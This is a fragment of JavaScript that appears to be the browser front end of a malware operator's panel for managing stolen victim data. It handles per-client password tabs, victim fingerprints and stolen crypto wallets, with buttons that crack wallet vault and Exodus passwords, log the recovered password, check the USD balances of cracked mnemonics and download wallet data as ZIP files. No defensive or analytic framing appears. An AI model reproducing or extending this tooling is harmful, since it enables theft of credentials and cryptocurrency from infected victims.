        checkBalancesBtn.disabled = false;
      }
    });
  }

  if (wlGrid) {
    wlGrid.addEventListener("click", async (e) => {
      const crackBtn = e.target.closest(".wl-crack-btn");
      if (crackBtn) {
        const walletName = crackBtn.dataset.wallet;
        const crackType = crackBtn.dataset.crackType || "vault";
        const cid = isGlobal ? (activeClient !== "all" ? activeClient : null) : clientId;
        if (!cid || !walletName) return;
        crackBtn.disabled = true;
        crackBtn.textContent = "Cracking…";
        try {
          const rpcMethod = crackType === "desktop" ? "crack_exodus" : "crack_vault";
          const result = await rpc(rpcMethod, { clientId: cid, walletName });
          walletCrackResults[walletName] = result;
          if (result.cracked) log(`Wallet cracked for ${walletName}! Password: ${result.password}`);
          else log(`Wallet crack failed for ${walletName} — ${result.tried} passwords tried`);
          await loadWalletCards();
        } catch (err) {
          log(`Crack error: ${err.message}`);
          crackBtn.disabled = false;
          crackBtn.textContent = crackType === "desktop" ? "Crack Wallet" : "Crack Vault";
        }
        return;
      }

      const balBtn = e.target.closest(".wl-check-bal-btn");
      if (balBtn) {
        const walletName = balBtn.dataset.wallet;
        const crackResult = walletCrackResults[walletName];
        if (!crackResult?.mnemonic) return;
        balBtn.disabled = true;
        balBtn.textContent = "Checking…";
        try {
          const result = await rpc("check_cracked_balances", { mnemonic: crackResult.mnemonic });
          walletCrackResults[walletName] = { ...crackResult, balances: result.totals, usdTotal: result.usdTotal };
          if (result.usdTotal > 0) log(`${walletName}: $${result.usdTotal.toFixed(2)} total value`);
          else log(`${walletName}: no balances found`);
          await loadWalletCards();
        } catch (err) {
          log(`Balance check error: ${err.message}`);
          balBtn.disabled = false;
          balBtn.textContent = "Check Balances";
        }
        return;
      }

      const dlBtn = e.target.closest(".wl-dl-btn");
      if (dlBtn) {
        const id = dlBtn.dataset.id;
        const name = dlBtn.dataset.name;
        dlBtn.disabled = true;
        dlBtn.textContent = "…";
        try {
          const result = await rpc("download_wallet_data", { id: Number(id) });
          downloadBase64(result.content, `${result.name || name}.zip`, "application/zip");
          log(`Downloaded wallet: ${name}`);
        } catch (err) {
          log(`Download error: ${err.message}`);
        } finally {
          dlBtn.disabled = false;
          dlBtn.textContent = "Download ZIP";
        }
      }
    });
  }

  // ── Shared listeners ──────────────────────────────────────────
  searchEl.addEventListener("input", () => {
    const q = searchEl.value.trim();
    if (searchClear) searchClear.classList.toggle("visible", !!searchEl.value);
    if (isGlobal) {
      clearTimeout(searchTimer);
      searchTimer = setTimeout(() => {
        if (q) {
          activeTab = "__search__";
          buildTabs(); buildBfilts();
          loadSearchAll();
        } else {
          searchAllResults = null;
          if (activeTab === "__search__") activeTab = "passwords";
          buildTabs(); buildBfilts();
          loadGlobalTab();
        }
      }, 300);
    } else {
      if (q) {
        activeTab = "__search__";
        loadSearchAllLocal();
      } else {
        searchAllResults = null;
        if (activeTab === "__search__") activeTab = "passwords";
        buildTabs();
      }
      renderTable();
    }
  });

  revealToggle.addEventListener("change", () => {
    showSensitive = revealToggle.checked;
    renderTable();
  });

  // Clear-search button
  if (searchClear) searchClear.addEventListener("click", () => {
    searchEl.value = "";
    searchClear.classList.remove("visible");
    searchEl.dispatchEvent(new Event("input"));
    searchEl.focus();
  });

  // Keyboard shortcuts: "/" focuses search, Esc clears it.
  document.addEventListener("keydown", (e) => {
    const tag = document.activeElement ? document.activeElement.tagName : "";
    if (e.key === "/" && tag !== "INPUT" && tag !== "TEXTAREA") {
      e.preventDefault();
      searchEl.focus();
      searchEl.select();
    } else if (e.key === "Escape" && document.activeElement === searchEl && searchEl.value) {
      searchEl.value = "";
      searchClear.classList.remove("visible");
      searchEl.dispatchEvent(new Event("input"));
    }
  });

  if (exportTabBtn) exportTabBtn.addEventListener("click", async () => {
    exportTabBtn.disabled = true;
    try { await exportCurrentTab(); }
    catch (e) { log(`Export error: ${e.message}`); }
    finally { exportTabBtn.disabled = false; }
  });

  // ── Fingerprint modal controls ────────────────────────────────
  if (fpClose) fpClose.addEventListener("click", closeFingerprint);
  if (fpOverlay) fpOverlay.addEventListener("click", (e) => { if (e.target === fpOverlay) closeFingerprint(); });
  if (fpCopy) fpCopy.addEventListener("click", () => {
    if (!fpData) return;
    navigator.clipboard.writeText(JSON.stringify(fpData, null, 2))
      .then(() => log("Fingerprint copied to clipboard"))
      .catch(() => log("Copy failed"));
  });
  if (fpDownload) fpDownload.addEventListener("click", () => {
    if (!fpData) return;
    downloadBlob(new Blob([JSON.stringify(fpData, null, 2)], { type: "application/json" }), "fingerprint.json");
  });

  // ── Init ──────────────────────────────────────────────────────
  if (isGlobal) initGlobalMode();
  else initClientMode();
})();
